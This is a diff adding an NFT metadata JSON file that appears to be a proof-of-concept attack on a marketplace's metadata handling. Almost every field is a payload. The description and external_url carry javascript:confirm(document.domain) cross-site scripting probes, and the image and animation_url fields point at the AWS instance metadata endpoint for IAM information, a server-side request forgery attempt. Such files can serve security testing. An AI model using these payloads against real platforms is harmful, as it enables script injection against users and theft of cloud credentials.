@@ -1,0 +1,8 @@
+{
+  "description": "Friendly OpenSea Creature! [ClickMe](javascript:confirm(document.domain))", 
+  "external_url": "javascript:confirm(document.domain);", 
+  "image": "http://169.254.169.254/latest/meta-data/iam/info?.svg", 
+  "name": "feiyugh",
+  "attributes": [{"anthill":"dfve"}], 
+  "animation_url":"http://169.254.169.254/latest/meta-data/iam/info"
+}
